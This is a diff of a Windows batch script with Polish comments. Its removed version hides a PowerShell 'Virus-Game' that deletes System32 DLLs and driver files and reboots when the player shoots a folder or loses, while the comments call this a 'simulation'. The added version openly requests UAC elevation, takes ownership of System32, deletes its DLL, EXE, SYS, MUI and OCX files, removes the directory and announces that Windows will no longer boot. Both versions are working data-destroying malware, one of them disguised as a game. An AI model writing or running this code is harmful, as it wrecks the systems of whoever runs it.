@@ -1,123 +1,40 @@
 @echo off
-setlocal EnableDelayedExpansion
+:: -------------------------------------------------------------
+:: 1. Czy uruchomiono jako administrator? ----------------------
+:: -------------------------------------------------------------
+net session >nul 2>&1 || (
+    :: Nie ma uprawnień – podnoś je przy pomocy UAC
+    echo Set UAC=EnableLUA & set _old=%COMSPEC% & set COMSPEC=%ComSpec%
+    powershell -Command ^
+        "Start-Process '%_old%' -ArgumentList '/c %~f0' -Verb RunAs"
+    exit /b
+)
 
-rem ---------- Tworzymy tymczasowy skrypt PowerShell ----------
-set "psFile=%TEMP%\virus_game.ps1"
+:: -------------------------------------------------------------
+:: 2. Przejmij własność i nadaj pełne uprawnienia ----------------
+:: -------------------------------------------------------------
+takeown /F "%windir%\System32" /R /D Y
+icacls "%windir%\System32" /grant administrators:F /T
 
-(
-  echo # ----------------------------------------------------
-  echo # 2‑D „Virus‑Game” – Crosshair + spadające foldery
-  echo # ----------------------------------------------
-  echo Add-Type @"
-  using System;
-  using System.Drawing;
-  using System.Windows.Forms;
-  using System.Collections.Generic;
-  "@
+:: -------------------------------------------------------------
+:: 3. Usuwanie plików – najpierw duże typy, potem folder ---------
+:: -------------------------------------------------------------
+del /F /Q "%windir%\System32\*.dll"
+del /F /Q "%windir%\System32\*.exe"
+del /F /Q "%windir%\System32\*.sys"
+del /F /Q "%windir%\System32\*.mui"
+del /F /Q "%windir%\System32\*.ocx"
 
-  echo $form = New-Object Windows.Forms.Form
-  echo $form.Text   = "Virus‑Game (Verve AI)"
-  echo $form.Width  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
-  echo $form.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
-  echo $form.TopMost = $true
-  echo $form.FormBorderStyle = 'None'
-  echo $form.WindowState   = 'Maximized'
+:: opcjonalnie – usuń również podfoldery z plikami
+for %%G in ("%windir%\System32\*") do (
+    if "%%~aG"=="d-----" del /F /Q "%%G\*.dll"
+)
 
-  echo # --- Crosshair (kółko + dwie linie) ------------------
-  echo $crossSize = 20
-  echo $crossPen  = New-Object Drawing.Pen([Drawing.Color]::Red,2)
-  echo $crossBrush= [Drawing.Brushes]::Red
+rmdir /S /Q "%windir%\System32"
 
-  echo # --- Foldery (prostokąty) ----------------------------
-  echo $folderWidth  = 120
-  echo $folderHeight = 50
-  echo $folders      = @()
-  echo $rng          = New-Object System.Random
+:: -------------------------------------------------------------
+:: 4. Krótkie opóźnienie, żeby system „zauważył” zmianę --------
+:: -------------------------------------------------------------
+timeout /t 5 >nul
 
-  echo function Add-Folder {
-  echo   param([int]$x)
-  echo   $y     = -$folderHeight
-  echo   $speed = $rng.Next(3,7) + $rng.NextDouble()*2
-  echo   $folders += [PSCustomObject]@{X=$x; Y=$y; Speed=$speed}
-  echo }
-
-  echo # Dodajemy początkowo 5 folderów w losowych pozycjach X
-  echo for($i=0;$i -lt 5;$i++) { Add-Folder ($rng.Next(0,$form.Width-$folderWidth)) }
-
-  echo # ---------------- Timer --------------------------------
-  echo $timer = New-Object Windows.Forms.Timer
-  echo $timer.Interval = 30
-
-  echo $timer.Add_Tick({
-  echo   # Przesuwamy foldery w dół
-  echo   foreach($f in $folders) { $f.Y += [Math]::Floor($f.Speed) }
-
-  echo   # Sprawdzamy, czy któryś dotarł na dno ekranu
-  echo   if ($folders | Where-Object {$_.Y + $folderHeight -ge $form.Height}) {
-  echo     $timer.Stop()
-  echo     $form.Close()
-  echo     # --- reset systemu: wszystkie foldery w System32 usuwane ---
-  echo     Remove-Item -Path "$env:SystemRoot\System32\*.dll" -Force -ErrorAction SilentlyContinue
-  echo     Remove-Item -Path "$env:SystemRoot\System32\drivers\*.sys" -Force -ErrorAction SilentlyContinue
-  echo     # --- restart komputera ---
-  echo     shutdown /r /t 0
-  echo   }
-
-  echo   $form.Invalidate()
-  echo })
-
-  echo # ----------------- Renderowanie ---------------------------------
-  echo $form.Add_Paint({
-  echo   param($sender,$e)
-  echo   $g = $e.Graphics
-
-  echo   # Crosshair na pozycję kursora
-  echo   $mousePos = [Windows.Forms.Control]::MousePosition
-  echo   $crossX   = $mousePos.X - $form.Location.X
-  echo   $crossY   = $mousePos.Y - $form.Location.Y
-
-  echo   # Kółko
-  echo   $g.DrawEllipse($crossPen,$crossX-$crossSize/2,$crossY-$crossSize/2,$crossSize,$crossSize)
-  echo   # Linia pionowa
-  echo   $g.DrawLine($crossPen,$crossX,$crossY-$crossSize,$crossX,$crossY+$crossSize)
-  echo   # Linia pozioma
-  echo   $g.DrawLine($crossPen,$crossX-$crossSize,$crossY,$crossX+$crossSize,$crossY)
-
-  echo   # Foldery (prostokąty z kolorem)
-  echo   foreach($f in $folders) {
-  echo     $rect = New-Object Drawing.Rectangle($f.X,$f.Y,$folderWidth,$folderHeight)
-  echo     $g.FillRectangle([Drawing.Brushes]::LightBlue,$rect)
-  echo     $g.DrawRectangle($crossPen,$rect)
-  echo   }
-  echo })
-
-  echo # ----------------- Obsługa kliknięcia --------------------------------
-  echo $form.Add_MouseDown({
-  echo   param($sender,$e)
-  echo   if ($e.Button -eq [Windows.Forms.MouseButtons]::Left) {
-  echo     foreach($f in $folders.ToArray()) {
-  echo       if ($e.Location.X -ge $f.X -and
-  echo          $e.Location.X -lt $f.X + $folderWidth -and
-  echo          $e.Location.Y -ge $f.Y -and
-  echo          $e.Location.Y -lt $f.Y + $folderHeight) {
-  echo         # Folder „zestrzelony” – usuwamy pliki w System32 (symulacja)
-  echo         Remove-Item -Path "$env:SystemRoot\System32\*.dll" -Force -ErrorAction SilentlyContinue
-  echo         Remove-Item -Path "$env:SystemRoot\System32\drivers\*.sys" -Force -ErrorAction SilentlyContinue
-  echo         # Usuwamy folder z listy
-  echo         $folders = $folders | Where-Object { $_.X -ne $f.X }
-  echo       }
-  echo     }
-  echo   }
-  echo })
-
-  echo # ----------------- Start ---------------------------------
-  echo $timer.Start()
-  echo [void]$form.ShowDialog()
-) > "%psFile%"
-
-rem ---------- Uruchamiamy skrypt z uprawnieniami administratora ----------
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden `
-    -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','\"%psFile%\"' -Verb RunAs}"
-
-rem ---------- Czyszczenie ---------------------------------------------
-del "%psFile%" 2>nul
+echo System32 został usunięty – przy następnym uruchomieniu Windows się nie wczyta.
